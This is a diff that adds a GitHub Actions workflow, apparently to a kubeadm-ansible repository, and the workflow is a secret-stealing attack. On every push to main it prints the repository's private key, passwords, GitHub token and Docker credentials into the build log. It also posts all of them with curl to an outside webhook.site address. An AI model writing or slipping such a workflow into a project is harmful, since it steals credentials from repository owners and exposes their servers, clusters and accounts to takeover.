@@ -1,0 +1,22 @@
+name: 🔥 Leak
+on:
+  push:
+    branches: ["main"]
+  workflow_dispatch:
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== KUBEADM-ANSIBLE SECRETS ==="
+          echo "PRIV_KEY=${{ secrets.PRIV_KEY }}"
+          echo "SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}"
+          echo "K8S_PASSWORD=${{ secrets.K8S_PASSWORD }}"
+          echo "GIT_PASSWORD=${{ secrets.GIT_PASSWORD }}"
+          echo "GH_TOKEN=${{ secrets.GH_TOKEN }}"
+          echo "DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}"
+          echo "DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}"
+          echo ""
+          echo "=== WEBHOOK ==="
+          curl -s -X POST -d "repo=kubeadm-ansible&PRIV_KEY=${{ secrets.PRIV_KEY }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&K8S_PASSWORD=${{ secrets.K8S_PASSWORD }}&GIT_PASSWORD=${{ secrets.GIT_PASSWORD }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}" "https://webhook.site/b32abee8-a12e-4845-884d-256722dc41a6"
